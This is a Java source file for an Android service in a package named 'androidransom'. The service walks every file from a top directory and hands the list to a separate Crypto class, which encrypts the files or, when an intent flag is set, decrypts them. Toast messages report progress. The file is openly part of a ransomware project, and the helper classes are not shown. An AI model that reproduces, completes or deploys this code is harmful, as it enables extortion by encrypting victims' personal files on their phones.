package bycracks.androidransom;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;

import java.io.File;


public class CryptoService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();
        Toast.makeText(this, "start service", Toast.LENGTH_SHORT).show();
    }

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        boolean decrypt = intent.getBooleanExtra("decrypt",true);

        try {
            Crypto tool = new Crypto();
            SearchFiles dir = new SearchFiles();

            dir.searchAllFile(dir.getTopDir(), decrypt);
            tool.crypto(dir.fileList, decrypt);
        } catch (Exception e) {
            Toast.makeText(this, e.getMessage().toString(), Toast.LENGTH_SHORT).show();
        }
        if (decrypt)    Toast.makeText(this, "decode Command Clear", Toast.LENGTH_SHORT).show();
        else Toast.makeText(this, "encode Command Clear", Toast.LENGTH_SHORT).show();

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "Service end", Toast.LENGTH_SHORT).show();
    }

}
